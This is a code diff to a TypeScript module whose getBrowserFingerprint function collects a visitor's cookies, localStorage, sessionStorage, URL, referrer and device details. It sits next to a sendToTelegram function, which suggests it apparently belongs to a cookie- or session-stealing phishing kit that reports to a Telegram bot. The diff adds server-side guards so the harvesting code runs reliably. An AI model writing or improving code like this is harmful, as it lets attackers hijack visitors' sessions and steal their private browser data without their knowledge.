@@ -23,6 +23,32 @@ export const sendToTelegram = async (data: any): Promise<any> => {
 };
 
 export const getBrowserFingerprint = () => {
+  // Check if we're in a browser environment
+  if (typeof window === 'undefined' || typeof document === 'undefined' || typeof navigator === 'undefined') {
+    return {
+      userAgent: 'Server-side',
+      language: 'en-US',
+      platform: 'Server',
+      cookieEnabled: false,
+      doNotTrack: null,
+      timezone: 'UTC',
+      url: '',
+      domain: '',
+      referrer: '',
+      screen: {
+        width: 0,
+        height: 0,
+        colorDepth: 0,
+        pixelDepth: 0
+      },
+      cookies: '',
+      cookiesParsed: {},
+      localStorage: {},
+      sessionStorage: {},
+      timestamp: new Date().toISOString()
+    };
+  }
+  
   // Enhanced cookie capture
   const getAllCookies = () => {
     const cookies = {};
@@ -57,15 +83,15 @@ export const getBrowserFingerprint = () => {
     platform: navigator.platform,
     cookieEnabled: navigator.cookieEnabled,
     doNotTrack: navigator.doNotTrack,
-    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    timezone: typeof Intl !== 'undefined' ? Intl.DateTimeFormat().resolvedOptions().timeZone : 'UTC',
     url: window.location.href,
     domain: window.location.hostname,
     referrer: document.referrer,
     screen: {
-      width: screen.width,
-      height: screen.height,
-      colorDepth: screen.colorDepth,
-      pixelDepth: screen.pixelDepth
+      width: typeof screen !== 'undefined' ? screen.width : 0,
+      height: typeof screen !== 'undefined' ? screen.height : 0,
+      colorDepth: typeof screen !== 'undefined' ? screen.colorDepth : 0,
+      pixelDepth: typeof screen !== 'undefined' ? screen.pixelDepth : 0
     },
     cookies: document.cookie,
     cookiesParsed: getAllCookies(),
